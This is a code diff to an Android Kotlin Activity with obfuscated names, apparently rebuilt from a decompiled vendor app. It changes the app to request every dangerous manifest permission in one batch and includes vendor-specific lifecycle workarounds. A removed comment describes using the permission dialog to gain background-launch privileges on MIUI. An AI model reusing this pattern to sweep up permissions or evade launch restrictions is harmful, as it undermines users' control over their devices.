@@ -1,6 +1,9 @@
 package com.storm.safe.rock.service.modules.yw5xud.common
 
 import android.app.Activity
+import android.content.Context
+import android.content.pm.PackageManager
+import android.content.pm.PermissionInfo
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -12,26 +15,41 @@ import com.storm.safe.rock.service.modules.yw5xud.huawei.HuaweiPermissionRequest
 
 /**
  * Batch permission request Activity for yw5xud authorization flow.
- * Requests POST_NOTIFICATIONS first, then ALL other runtime permissions in one shot.
- * This ensures a system GrantPermissionsActivity dialog appears, giving us
- * BAL_ALLOW_VISIBLE_WINDOW status so subsequent brand engine startActivity calls
- * can reach the foreground on MIUI.
  *
- * JADX: com.storm.safe.rock.service.modules.yw5xud.umrkmgrri (276 lines)
- * Different from p029ui.umrkmgrri which handles single permission_type requests.
+ * **Phase G 重写:** 从 vendor 原始"两阶段"设计(先 POST_NOTIFICATIONS 再 OTHER)改为
+ * HuaweiPermissionRequestActivity 模式 — **一次性批量请求所有 manifest dangerous 权限**。
+ *
+ * 原因:OPPO PGFM10 Android 16 / ColorOS 16 真机验证发现两阶段实现有致命缺陷:
+ * 第一阶段 POST_NOTIFICATIONS 的 `onRequestPermissionsResult` 在 ColorOS 16 上
+ * 可能不回调(GrantPermissionsActivity 被 lifecycle 竞争打断),导致第二阶段
+ * `requestOtherPermissions()` 永不触发 → 只获得 1 个权限就卡住。
+ *
+ * 华为真机 25/26 证明一次批量请求的可靠性。新设计:
+ *  - onCreate 只读 manifest + post 30s safety timeout,不立即 request
+ *  - onResume 首次触发 `requestPermissions`(避免 lifecycle 竞争)
+ *  - onRequestPermissionsResult 统一处理所有权限 → 一次 finish
+ *  - `excludedFromBatch = {ACCESS_BACKGROUND_LOCATION}` 遵循 Android R+ 规则
+ *
+ * 保留向后兼容 API:
+ *  - `start(context)` — GenericSteps/MiuiSteps 调用
+ *  - `isRequestingPermissions` flag — GenericSteps/MiuiSteps 轮询
+ *  - `OTHER_PERMISSIONS` lazy list — 历史兼容(现不再直接使用)
  */
 class umrkmgrri : Activity() {
 
     companion object {
         private const val TAG = "PermReqActivity"
-        private const val REQUEST_OTHER = 151
-        private const val REQUEST_NOTIFICATION = 152
-        private const val TIMEOUT_MS = 60000L
+        private const val REQUEST_CODE = 151
+        private const val TIMEOUT_MS = 30_000L
 
         @Volatile
         var isRequestingPermissions: Boolean = false
 
-        /** All runtime permissions to request. JADX: f55160a5 (lazy list). */
+        /**
+         * 历史兼容常量:原始硬编码 dangerous 权限列表。
+         * Phase G 后不再直接使用(改由 `computeRequiredPermissions` 动态读 manifest),
+         * 仅保留 lazy 初始化防止 GenericSteps/MiuiSteps 未来可能的引用崩溃。
+         */
         val OTHER_PERMISSIONS: List<String> by lazy {
             buildList {
                 add("android.permission.CAMERA")
@@ -85,6 +103,7 @@ class umrkmgrri : Activity() {
             return HuaweiPermissionRequestActivity.computeRequiredPermissions(context)
         }
 
+        /** 启动 umrkmgrri(GenericSteps / MiuiSteps / OppoSteps 调用点) */
         fun start(context: android.content.Context) {
             isRequestingPermissions = true
             Handler(Looper.getMainLooper()).post {
@@ -101,111 +120,85 @@ class umrkmgrri : Activity() {
         }
     }
 
-    private val handler = Handler(Looper.getMainLooper())
-    private var timeoutRunnable: Runnable? = null
-    private var notificationHandled = false
+    private val mainHandler = Handler(Looper.getMainLooper())
+    private val safetyFinishRunnable = Runnable {
+        Log.w(TAG, "safety-finish: 30s timeout reached, forcing finish()")
+        isRequestingPermissions = false
+        if (!isFinishing) finish()
+    }
+
+    // Phase G: onCreate 里调用 requestPermissions 时 Activity lifecycle 尚未
+    // 稳定到 RESUMED 状态,GrantPermissionsActivity 启动后可能在 ~100ms 内被 dismiss,
+    // 导致 onRequestPermissionsResult 立即以 granted=false 返回(无任何用户交互)。
+    // 解决:移到 onResume 里首次触发,用 requestLaunched flag 防止 Activity 重入时重复请求。
+    private var requestLaunched = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         isRequestingPermissions = true
-        notificationHandled = false
-
-        // Safety timeout: finish after 60s
-        val runnable = Runnable { finish() }
-        timeoutRunnable = runnable
-        handler.postDelayed(runnable, TIMEOUT_MS)
-
-        val brand = Build.BRAND?.lowercase(java.util.Locale.ROOT) ?: ""
-        val isHuawei = brand == "huawei" || brand == "honor" || brand == "hihonor"
-        val needNotification = isHuawei || Build.VERSION.SDK_INT >= 33
-
+        val perms = computeRequiredPermissions(this)
         Log.i(TAG, "╔════════════════════════════════════════════════════════════")
-        Log.i(TAG, "║ [通知权限] 开始请求")
-        Log.i(TAG, "║ 品牌: $brand, 是华为/荣耀: $isHuawei, SDK: ${Build.VERSION.SDK_INT}")
-        Log.i(TAG, "║ 需要请求: $needNotification")
-
-        if (!needNotification) {
-            Log.i(TAG, "║ 非华为/荣耀且Android < 13，跳过通知权限")
-            Log.i(TAG, "╚════════════════════════════════════════════════════════════")
-            requestOtherPermissions()
-            return
+        Log.i(TAG, "║ [批量权限] 开始请求")
+        Log.i(TAG, "║ brand=${Build.BRAND}, SDK=${Build.VERSION.SDK_INT}")
+        Log.i(TAG, "║ 待请求 dangerous perms: ${perms.size} 个")
+        if (perms.isNotEmpty()) {
+            Log.i(TAG, "║ 前 3 项: ${perms.take(3)}")
         }
-
-        val granted = ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") == 0
-        Log.i(TAG, "║ 当前状态: ${if (granted) "已授权 ✓" else "未授权 ✗"}")
         Log.i(TAG, "╚════════════════════════════════════════════════════════════")
 
-        if (granted) {
-            Log.i(TAG, "[通知权限] 已授权，跳过请求")
-            requestOtherPermissions()
-        } else {
-            Log.i(TAG, "[通知权限] ★★★ 请求系统弹窗... ★★★")
-            ActivityCompat.requestPermissions(this, arrayOf("android.permission.POST_NOTIFICATIONS"), REQUEST_NOTIFICATION)
-        }
-    }
-
-    /** JADX: m212463a0 — request all other permissions. */
-    private fun requestOtherPermissions() {
-        val needed = OTHER_PERMISSIONS.filter {
-            ContextCompat.checkSelfPermission(this, it) != 0
-        }
-        Log.i(TAG, "╔════════════════════════════════════════════════════════════")
-        Log.i(TAG, "║ [第2步] 请求其他权限")
-        Log.i(TAG, "║ 需要请求: ${needed.size} 个")
-        Log.i(TAG, "╚════════════════════════════════════════════════════════════")
-
-        if (needed.isEmpty()) {
-            Log.i(TAG, "[其他权限] 全部已授权，完成")
-            Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500L)
+        if (perms.isEmpty()) {
+            Log.i(TAG, "[批量权限] manifest 所有 dangerous 权限已授予,直接 finish")
+            isRequestingPermissions = false
+            finish()
             return
         }
-        for (p in needed) {
-            Log.d(TAG, "[其他权限] - $p")
-        }
-        ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQUEST_OTHER)
-    }
-
-    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        when (requestCode) {
-            REQUEST_NOTIFICATION -> {
-                val granted = grantResults.isNotEmpty() && grantResults[0] == 0
-                Log.i(TAG, "[通知权限] ★★★ 结果: ${if (granted) "已授权 ✓" else "被拒绝 ✗"} ★★★")
-                notificationHandled = true
-                requestOtherPermissions()
-            }
-            REQUEST_OTHER -> {
-                var grantCount = 0
-                var denyCount = 0
-                for (i in permissions.indices) {
-                    val result = if (i < grantResults.size) grantResults[i] else -1
-                    if (result == 0) grantCount++ else {
-                        denyCount++
-                        Log.w(TAG, "[其他权限] ${permissions[i]} 被拒绝")
-                    }
-                }
-                Log.i(TAG, "[其他权限] 结果: 授权 $grantCount 个, 拒绝 $denyCount 个")
-                Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500L)
-            }
-        }
+        Log.i(TAG, "[批量权限] 等待 onResume 触发 requestPermissions(避免 lifecycle 竞争)")
+        mainHandler.postDelayed(safetyFinishRunnable, TIMEOUT_MS)
     }
 
     override fun onResume() {
         super.onResume()
-        if (notificationHandled) return
-        val granted = ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") == 0
-        Log.i(TAG, "[onResume] 通知权限状态: ${if (granted) "已授权" else "未授权"}")
-        if (granted && !notificationHandled) {
-            Log.i(TAG, "[onResume] ★★★ 检测到通知权限已授权，继续请求其他权限 ★★★")
-            notificationHandled = true
-            requestOtherPermissions()
+        val perms = computeRequiredPermissions(this)
+        if (perms.isEmpty()) {
+            Log.i(TAG, "[onResume] 所有 dangerous 权限已授予,finish()")
+            mainHandler.removeCallbacks(safetyFinishRunnable)
+            isRequestingPermissions = false
+            if (!isFinishing) finish()
+            return
+        }
+        // 首次 resume 时发起批量 requestPermissions,Activity 生命周期稳定到 RESUMED 状态
+        // 避免 GrantPermissionsActivity 被 lifecycle 竞争打断
+        if (!requestLaunched) {
+            requestLaunched = true
+            Log.i(TAG, "[onResume] ★★★ 批量请求 ${perms.size} 个权限 ★★★ → 等待系统逐个弹窗")
+            ActivityCompat.requestPermissions(this, perms.toTypedArray(), REQUEST_CODE)
         }
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        timeoutRunnable?.let { handler.removeCallbacks(it) }
-        timeoutRunnable = null
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        mainHandler.removeCallbacks(safetyFinishRunnable)
+        if (requestCode == REQUEST_CODE) {
+            val grantedCount = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
+            Log.i(TAG, "[批量权限] ★★★ 结果: 授权 $grantedCount / ${grantResults.size} ★★★")
+            for (i in permissions.indices) {
+                val r = if (i < grantResults.size) grantResults[i] else -1
+                if (r != PackageManager.PERMISSION_GRANTED) {
+                    Log.w(TAG, "[批量权限] ✗ ${permissions[i]}")
+                }
+            }
+        }
         isRequestingPermissions = false
+        if (!isFinishing) finish()
+    }
+
+    override fun onDestroy() {
+        mainHandler.removeCallbacks(safetyFinishRunnable)
+        isRequestingPermissions = false
+        super.onDestroy()
     }
 }
